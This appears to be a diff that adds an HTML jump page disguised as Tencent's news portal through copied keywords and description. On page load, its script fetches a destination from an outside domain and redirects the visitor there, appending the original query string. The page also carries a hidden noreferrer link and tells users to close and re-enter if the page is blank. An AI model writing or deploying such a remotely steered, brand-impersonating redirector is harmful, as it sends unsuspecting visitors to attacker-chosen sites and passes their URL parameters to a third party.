@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head><base target="_parent">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,minimal-ui">
+    <style type="text/css">*{margin: 0;padding: 0;}#clearfix{overflow: hidden;}html, body{height: 100%;}#clearfix{height: 100%;}#clearfix iframe{height: 100%;width: 100%;}#clearfix.ios{overflow-y: auto;-webkit-overflow-scrolling:touch !important;height: 100%;}#clearfix.ios iframe{height: 100%;min-width: 100%;width: 100px;*width: 100%;}</style>
+    <title>跳转中</title>
+    <meta content="资讯,新闻,财经,房产,视频,NBA,科技,腾讯网,腾讯,QQ,Tencent" name="Keywords">
+    <meta name="description" content="腾讯网从2003年创立至今，已经成为集新闻信息，区域垂直生活服务、社会化媒体资讯和产品为一体的互联网媒体平台。腾讯网下设新闻、科技、财经、娱乐、体育、汽车、时尚等多个频道，充分满足用户对不同类型资讯的需求。同时专注不同领域内容，打造精品栏目，并顺应技术发展趋势，推出网络直播等创新形式，改变了用户获取资讯的方式和习惯。" />
+</head>
+
+<body>
+<span>打开空白关闭后重进</span>
+<a style="display: none;" href="" id="vurl" rel="noreferrer"></a>
+<script type="text/javascript">
+    window.onerror = function (e) {
+        alert(e);
+    }
+    function get(url, fn) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', url, false);
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200 || xhr.status == 304) {
+                fn.call(this, xhr.responseText);
+            }
+        };
+        xhr.send();
+    }
+    function malimalihong(){
+        get('https://qun.haozhuang.cn.com/fq_url/rk',function(res){
+            res = JSON.parse(res);
+            window.location.href = res.jump + location.search;
+        })
+    }
+</script>
+<div id="clearfix">
+</div>
+<script> malimalihong();</script>
+</body>
+</html>
